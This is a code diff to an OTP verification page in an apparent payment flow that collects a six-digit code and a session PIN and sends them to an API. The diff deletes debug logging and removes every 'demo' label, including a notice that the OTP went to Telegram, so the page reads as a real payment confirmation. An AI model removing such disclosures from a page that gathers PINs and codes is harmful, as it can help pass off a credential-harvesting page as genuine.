@@ -9,8 +9,7 @@
 <body>
   <div class="card">
     <h1>OTP Verification</h1>
-    <p id="otpSub"></p>
- 
+
     <form id="otpForm">
       <div class="otp-boxes">
         <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" required>
@@ -43,13 +42,6 @@ const demoPin =
 // Make sure a transaction exists
 if (!transactionId) {
     window.location.href = 'index.html';
-}
-
-// Safely update subtitle message
-const subEl = document.getElementById('otpSub');
-if (subEl) {
-    subEl.textContent =
-        'We sent a 6-digit DEMO OTP to Telegram. Enter it below to confirm.';
 }
 
 // Back button
@@ -121,7 +113,7 @@ if (otpForm) {
             msg.style.display = 'none';
         }
 
-        // Check OTP
+        // Check OTP length
         if (code.length !== 6) {
             if (msg) {
                 msg.className = 'err';
@@ -131,12 +123,12 @@ if (otpForm) {
             return;
         }
 
-        // Check demo PIN
+        // Check PIN stored in session
         if (!/^\d{4}$/.test(demoPin || '')) {
             if (msg) {
                 msg.className = 'err';
                 msg.textContent =
-                    'Demo PIN is missing. Please start the demo payment again.';
+                    'Session expired. Please restart the payment process.';
                 msg.style.display = 'block';
             }
             return;
@@ -146,17 +138,8 @@ if (otpForm) {
             if (msg) {
                 msg.className = '';
                 msg.style.display = 'block';
-                msg.textContent = 'Verifying demo OTP...';
+                msg.textContent = 'Verifying OTP...';
             }
-
-            console.log(
-                'Sending demo verification:',
-                {
-                    transactionId,
-                    code,
-                    hasDemoPin: !!demoPin
-                }
-            );
 
             const res = await fetch(
                 `${API_BASE}/api/verify-otp`,
@@ -177,11 +160,6 @@ if (otpForm) {
 
             const data = await res.json();
 
-            console.log(
-                'Verification response:',
-                data
-            );
-
             if (
                 !res.ok ||
                 !data.ok
@@ -192,7 +170,7 @@ if (otpForm) {
                 );
             }
 
-            // Save successful demo transaction
+            // Save successful transaction
             sessionStorage.setItem(
                 'verifiedTransaction',
                 JSON.stringify(
@@ -203,7 +181,7 @@ if (otpForm) {
             if (msg) {
                 msg.className = 'success';
                 msg.textContent =
-                    '✓ Demo payment confirmed successfully!';
+                    '✓ Payment confirmed successfully!';
             }
 
             // Go to confirmation page
